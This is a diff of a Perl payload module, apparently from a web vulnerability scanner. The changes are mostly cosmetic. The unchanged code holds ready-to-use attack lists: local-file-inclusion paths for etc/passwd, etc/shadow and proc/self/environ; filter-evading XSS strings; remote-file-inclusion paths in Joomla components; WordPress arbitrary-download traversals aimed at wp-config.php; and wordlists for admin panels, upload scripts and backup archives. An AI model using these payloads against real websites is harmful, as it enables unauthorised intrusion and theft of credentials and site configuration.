@@ -1,12 +1,10 @@
 #!/usr/bin/perl
 use strict;
 use warnings;
-## ALISAM TECHNOLOGY 2015
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
-my (@XSS, @LFI, @RFI, @ADFWP, @ADMIN, @SUBDOMAIN, @UPLOAD, @ZIP);
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+## Copy@right Alisam Technology see License.txt
+
+our (@XSS, @LFI, @RFI, @ADFWP, @ADMIN, @SUBDOMAIN, @UPLOAD, @ZIP);
+
 ## LFI
 my @LFIargs=("passwd.txt", "etc/passwd", "proc/self/environ", "etc/shadow", "etc/group", "etc/security/passwd", "etc/security/group");
 my (@LFI1, @LFI2);
@@ -22,15 +20,13 @@ for my $LFIargs(@LFIargs) {
   push @LFI, @LFI1;
   for my $LFI1(@LFI1) { $LFI1=~s/\//%2F/ig; push @LFI, $LFI1; }
 }
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## XSS
 @XSS=("%27", "'><script>alert('MySQL Error')</script>", "<scr<script>ipt>alert(/MySQL Error/)</scr</script>ipt>", "%253script%253ealert(/MySQL Error/)%253c/script%253e",
          "\">head<script>alert('MySQL Error')</script>head\">", "%22%3Ehead%3Cscript%3Ealert(%27MySQL%20Error%27)%3C%2Fscript%3Ehead%22%3E%22%00", "<IMG onmouseover=\"alert('MySQL Error')\">",
          "\";alert('MySQL Error');//", "</script><script>alert('MySQL Error');</script>", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('MySQL Error');\">",
          "<BODY BACKGROUND=\"javascript:alert('MySQL Error')\">", "<BODY ONLOAD=alert('MySQL Error')>");
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## RFI
 my @RFIargs=("/JMc/com_flyspray/startdown.php?file=", "/JMa/JMc/com_admin/admin.admin.html.php?PP1", "/JMc/com_simpleboard/file_upload.php?PP5", "/JMc/com_hashcash/server.php?PP1",
              "/JMc/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?PP1", "/JMc/com_sitemap/sitemap.xml.php?PP1", "/JMc/com_performs/performs.php?PP1",
@@ -81,7 +77,7 @@ my @RFIargs=("/JMc/com_flyspray/startdown.php?file=", "/JMa/JMc/com_admin/admin.
              "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&PP1", "/com_ponygallery/admin.ponygallery.html.php?PP1",
              "/com_magazine_3_0_1/magazine.functions.php?config=", "/JMa/JMc/com_joomla-visites/core/include/myMailer.class.php?PP1", "/JMa/JMc/com_universal/includes/config/config.html.php?PP1",
              "/modules/mod_pxt_latest.php?PP2");
-######################################################################################################################################################################################################
+
 for my $RFIargs(@RFIargs) {
   $RFIargs=~s/JMa/administrator/ig;
   $RFIargs=~s/JMc/components/ig;
@@ -93,8 +89,7 @@ for my $RFIargs(@RFIargs) {
   elsif ($RFIargs=~/PP6/) { $RFIargs=~s/PP6/baseDir=/ig; }
   push @RFI, $RFIargs;
 }
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 #ADF WP WORDPRESS
 my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1",
 "WPATHT/ypo-theme/download.php?download=WP1",
@@ -121,7 +116,7 @@ my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1",
 "WPATHP/justified-image-grid/DWF=file:///var/www/WP1",
 "WPATHP/aspose-doc-exporter/aspose_doc_exporter_DWF=WP1",
 "WPATHP/aspose-cloud-ebook-generator/aspose_posts_exporter_DWF=WP1");
-######################################################################################################################################################################################################
+
 for my $ADFWPargs(@ADFWPargs) {
   $ADFWPargs=~s/DWF/download.php?file/ig;
   $ADFWPargs=~s/WPATHT/\/wp-content\/themes/ig;
@@ -131,8 +126,7 @@ for my $ADFWPargs(@ADFWPargs) {
     $ADFWPargs=~s/wp-config.php/repeat(..\/-5)wp-config.php/ig; push @ADFWP, $ADFWPargs; }
   else{ push @ADFWP, $ADFWPargs; }
 }
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## ADMIN PAGE
 my @ADMINARGS=("/admin/", "/admin/login.MYEXT", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/wp-admin/login.MYEXT", "/administrator/index.MYEXT", "/admin3/", "/admin4/",
                "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/administrator/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/",
@@ -147,7 +141,7 @@ my @ADMINARGS=("/admin/", "/admin/login.MYEXT", "/myadmin/", "/acceso/", "/admin
                "/panel-administracion/index.MYEXT", "/panel-administracion/admin.MYEXT", "/modelsearch/index.MYEXT", "/modelsearch/admin.MYEXT", "/admincontrol/login.MYEXT", "/adm/index.MYEXT",
                "adm.MYEXT", "account.MYEXT", "/adm/admloginuser.MYEXT", "/admloginuser.MYEXT", "/admin2.MYEXT", "/admin2/login.MYEXT", "/admin2/index.MYEXT", "/usuarios/login.MYEXT",
                "/users/login.MYEXT", "/adm.MYEXT", "/affiliate.MYEXT", "/adm_auth.MYEXT", "/memberadmin.MYEXT", "/administratorlogin.MYEXT");
-######################################################################################################################################################################################################
+
 for my $ADMINARGS(@ADMINARGS) {
   if ($ADMINARGS=~/MYEXT/) {
     $ADMINARGS=~s/MYEXT/php/ig; push @ADMIN, $ADMINARGS;
@@ -155,8 +149,7 @@ for my $ADMINARGS(@ADMINARGS) {
     $ADMINARGS=~s/html/asp/ig; push @ADMIN, $ADMINARGS;
   }else{ push @ADMIN, $ADMINARGS; } 
 }
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## SUBDOMAINS
 @SUBDOMAIN=("about.", "webmail.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.",
                "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.",
@@ -166,19 +159,16 @@ for my $ADMINARGS(@ADMINARGS) {
                "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.",
                "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.",
                "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## UPLOAD FILES
 @UPLOAD=("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php",
             "blog/upload.php", "site/upload.php", "download.php");
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## ZIP FILES
 @ZIP=("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql",
          "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip",
          "/blog/wordpress.zip", "/wordpress.rar");
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 ## MENU
 sub get_xss_payloads { return @XSS; }
 sub get_lfi_payloads { return @LFI; }
@@ -188,8 +178,5 @@ sub get_admin_payloads { return @ADMIN; }
 sub get_subdomain_payloads { return @SUBDOMAIN; }
 sub get_upload_payloads { return @UPLOAD; }
 sub get_zip_payloads { return @ZIP; }
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
+
 1;
-######################################################################################################################################################################################################
-######################################################################################################################################################################################################
